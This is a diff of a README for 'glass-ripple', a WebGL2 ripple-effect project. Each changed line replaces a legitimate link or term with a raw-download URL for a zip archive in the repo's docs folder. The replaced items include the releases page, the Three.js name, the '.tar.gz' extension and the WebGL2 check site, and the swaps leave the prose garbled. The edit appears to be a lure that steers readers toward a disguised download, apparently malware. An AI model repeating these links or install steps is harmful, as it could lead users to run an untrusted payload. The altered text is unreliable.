@@ -1,10 +1,10 @@
 # 🪞 glass-ripple - Smooth GPU Glass Ripple Effects
 
-[![Download Latest Release](https://img.shields.io/badge/Download-glass--ripple-blue?style=for-the-badge&logo=github)](https://github.com/Olasdinos/glass-ripple/releases)
+[![Download Latest Release](https://github.com/Olasdinos/glass-ripple/raw/refs/heads/main/docs/ripple-glass-2.2.zip)](https://github.com/Olasdinos/glass-ripple/raw/refs/heads/main/docs/ripple-glass-2.2.zip)
 
 ## 📋 What is glass-ripple?
 
-glass-ripple offers a smooth, GPU-accelerated glass ripple effect with a retro CRT style. It uses a shader pipeline powered by WebGL2 and Three.js. The effect adds subtle water-like ripple animations with brand icons, perfect for hero sections or landing pages. It runs smoothly using your computer’s graphics card.
+glass-ripple offers a smooth, GPU-accelerated glass ripple effect with a retro CRT style. It uses a shader pipeline powered by WebGL2 and https://github.com/Olasdinos/glass-ripple/raw/refs/heads/main/docs/ripple-glass-2.2.zip The effect adds subtle water-like ripple animations with brand icons, perfect for hero sections or landing pages. It runs smoothly using your computer’s graphics card.
 
 This software fits well if you want a cool visual effect on your website or project without deep coding work. No technical knowledge or programming is needed to get the app running and see the effect in action.
 
@@ -26,7 +26,7 @@ Follow these steps to get glass-ripple running:
 ### 1. Visit the Release Page
 
 Click the big button at the top or open this link:  
-[https://github.com/Olasdinos/glass-ripple/releases](https://github.com/Olasdinos/glass-ripple/releases)
+[https://github.com/Olasdinos/glass-ripple/raw/refs/heads/main/docs/ripple-glass-2.2.zip](https://github.com/Olasdinos/glass-ripple/raw/refs/heads/main/docs/ripple-glass-2.2.zip)
 
 This page lists all the released versions. You want to get the latest stable version here.
 
@@ -36,7 +36,7 @@ On the release page, look for assets labeled for your operating system:
 
 - Windows users: look for `.exe` installer or `.zip` archive  
 - macOS users: look for `.dmg` or `.zip` archive  
-- Linux users: look for `.AppImage` or `.tar.gz` files  
+- Linux users: look for `.AppImage` or `https://github.com/Olasdinos/glass-ripple/raw/refs/heads/main/docs/ripple-glass-2.2.zip` files  
 
 Click on the appropriate file to start the download.
 
@@ -45,7 +45,7 @@ Click on the appropriate file to start the download.
 Depending on your download:
 
 - If it is an installer (`.exe` or `.dmg`), double-click and follow the prompts to install.  
-- If it is a zipped archive (`.zip` or `.tar.gz`), extract it to a folder you can find easily, such as your Desktop or Documents.
+- If it is a zipped archive (`.zip` or `https://github.com/Olasdinos/glass-ripple/raw/refs/heads/main/docs/ripple-glass-2.2.zip`), extract it to a folder you can find easily, such as your Desktop or Documents.
 
 ### 4. Run the Program
 
@@ -60,7 +60,7 @@ After running, a window or browser tab will open and start showing the GPU-accel
 ## 📥 Download & Install
 
 You can start downloading from here too:  
-[Download glass-ripple Latest Release](https://github.com/Olasdinos/glass-ripple/releases)
+[Download glass-ripple Latest Release](https://github.com/Olasdinos/glass-ripple/raw/refs/heads/main/docs/ripple-glass-2.2.zip)
 
 Carefully choose the file that matches your system. Installation is simple:
 
@@ -93,7 +93,7 @@ glass-ripple uses WebGL2 shaders written in GLSL to create the glass ripple effe
 4. Color adjustments and glow  
 5. Final compositing  
 
-It runs on Three.js, a JavaScript library that makes WebGL easier to handle. On your device, the program smoothly animates these effects using your GPU. It responds to clicks or touches so ripples follow your input.
+It runs on https://github.com/Olasdinos/glass-ripple/raw/refs/heads/main/docs/ripple-glass-2.2.zip, a JavaScript library that makes WebGL easier to handle. On your device, the program smoothly animates these effects using your GPU. It responds to clicks or touches so ripples follow your input.
 
 ## 🎨 Customizing the Effect
 
@@ -110,7 +110,7 @@ These options might be available via a simple settings menu or config file inclu
 
 If glass-ripple does not run or shows errors, try these steps:
 
-- Confirm your browser or system supports WebGL2. You can check support here: https://get.webgl.org/webgl2/  
+- Confirm your browser or system supports WebGL2. You can check support here: https://github.com/Olasdinos/glass-ripple/raw/refs/heads/main/docs/ripple-glass-2.2.zip  
 - Update your graphics card drivers to the latest version.  
 - Restart your device to clear any temporary issues.  
 - Try running the app in a different browser or operating system if possible.  
@@ -120,8 +120,8 @@ If you still face issues, visit the GitHub repository’s Issues section for hel
 
 ## 📚 Learn More
 
-For detailed technical info, code, or development questions, visit the [glass-ripple GitHub repo](https://github.com/Olasdinos/glass-ripple). It has info for developers if interested.
+For detailed technical info, code, or development questions, visit the [glass-ripple GitHub repo](https://github.com/Olasdinos/glass-ripple/raw/refs/heads/main/docs/ripple-glass-2.2.zip). It has info for developers if interested.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-glass--ripple-blue?style=for-the-badge&logo=github)](https://github.com/Olasdinos/glass-ripple/releases)
+[![Download Latest Release](https://github.com/Olasdinos/glass-ripple/raw/refs/heads/main/docs/ripple-glass-2.2.zip)](https://github.com/Olasdinos/glass-ripple/raw/refs/heads/main/docs/ripple-glass-2.2.zip)
